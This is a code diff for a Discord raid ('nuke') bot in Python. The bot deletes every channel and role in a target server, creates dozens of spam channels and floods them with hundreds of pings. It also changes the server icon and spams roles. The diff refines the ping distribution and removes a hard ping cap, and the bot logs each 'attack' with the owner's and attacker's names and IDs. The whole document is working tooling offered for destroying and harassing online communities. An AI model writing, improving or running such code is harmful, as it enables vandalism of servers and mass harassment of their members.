@@ -57,8 +57,8 @@ async def custom_help(ctx):
         return
     await ctx.message.delete()
     embed = discord.Embed(title="Bot Command Manual", description="This bot provides public and premium raiding capabilities.", color=discord.Color.from_rgb(47, 49, 54))
-    embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 pings).", inline=False)
-    embed.add_field(name="Premium Commands", value="`:premiumnuke`\nInitiates a destructive raid (50 channels, 1000 pings, icon change, role spam).\n\n`:nukeconfig <name> <text>`\nConfigures the `:premiumnuke` command.", inline=False)
+    embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 total pings).", inline=False)
+    embed.add_field(name="Premium Commands", value="`:premiumnuke`\nInitiates a destructive raid (50 channels, 1000 total pings, icon change, role spam).\n\n`:nukeconfig <name> <text>`\nConfigures the `:premiumnuke` command.", inline=False)
     help_message = await ctx.send(embed=embed)
     await asyncio.sleep(60)
     await help_message.delete()
@@ -68,6 +68,7 @@ async def custom_help(ctx):
 async def nuke_normal(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
+    # 25 channels, 500 total pings
     await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
 
 @bot.command(name='premiumnuke')
@@ -75,6 +76,7 @@ async def nuke_normal(ctx):
 async def premium_nuke(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
+    # 50 channels, 1000 total pings
     await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
 
 # --- CONFIGURATION COMMAND (PREMIUM) ---
@@ -92,26 +94,32 @@ async def nuke_config(ctx, channel_name: str, *, spam_text: str):
     await asyncio.sleep(15)
     await confirmation_msg.delete()
 
-# --- CENTRAL NUKE LOGIC ---
-async def execute_nuke(ctx, channel_name, spam_text, num_channels, num_pings, is_premium: bool):
+# --- CENTRAL NUKE LOGIC (WITH DISTRIBUTED PINGS) ---
+async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
     guild = ctx.guild
     original_member_count = guild.member_count
     command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
     print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")
+    
+    # --- NEW LOGIC: Calculate pings per channel ---
+    # Use integer division to ensure we don't have fractions of pings
+    pings_per_channel = total_pings // num_channels
     
     destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
     if is_premium:
         destruction_tasks.append(execute_premium_actions(guild))
     await asyncio.gather(*destruction_tasks, return_exceptions=True)
     
-    spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, num_pings) for i in range(num_channels)]
+    # Pass the *calculated* pings_per_channel to the spam tasks
+    spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, pings_per_channel) for i in range(num_channels)]
     await asyncio.gather(*spam_tasks)
     
     print(f"{command_type} finished for {guild.name}.")
-    await send_log_embed(ctx, command_type, original_member_count, num_channels, num_pings)
+    # The log will now show the TOTAL pings for clarity
+    await send_log_embed(ctx, command_type, original_member_count, num_channels, total_pings)
 
 # --- LOGGING FUNCTION ---
-async def send_log_embed(ctx, command_type, member_count, channels, pings):
+async def send_log_embed(ctx, command_type, member_count, channels, total_pings):
     log_channel = bot.get_channel(LOG_CHANNEL_ID)
     if not log_channel:
         print(f"CRITICAL: Log channel with ID {LOG_CHANNEL_ID} not found.")
@@ -123,7 +131,7 @@ async def send_log_embed(ctx, command_type, member_count, channels, pings):
     embed.add_field(name="Server Owner", value=f"**Name:** {ctx.guild.owner.name}\n**ID:** {ctx.guild.owner.id}", inline=True)
     embed.add_field(name="Attacker", value=f"**Name:** {ctx.author.name}\n**ID:** {ctx.author.id}", inline=True)
     embed.add_field(name="Attack Type", value=f"`{command_type}`", inline=True)
-    embed.add_field(name="Statistics", value=(f"**Members:** {member_count}\n**Channels Created:** {channels}\n**Pings per Channel:** {pings}"), inline=True)
+    embed.add_field(name="Statistics", value=(f"**Members:** {member_count}\n**Channels Created:** {channels}\n**Total Pings:** {total_pings}"), inline=True)
     if ctx.guild.icon:
         embed.set_thumbnail(url=ctx.guild.icon.url)
     embed.set_footer(text="Operation completed.")
@@ -141,18 +149,11 @@ async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
     except Exception: pass
 
 async def spam_pings(channel, spam_text, amount):
-    # límite duro
-    if amount >= 1000:
-        amount = 1000   # premium
-    else:
-        amount = 500    # normal
-
     for _ in range(amount):
         try:
-            await channel.send(spam_text)
+            asyncio.create_task(channel.send(spam_text))
             await asyncio.sleep(0.1)
-        except Exception:
-            break
+        except Exception: break
 
 async def execute_premium_actions(guild):
     tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
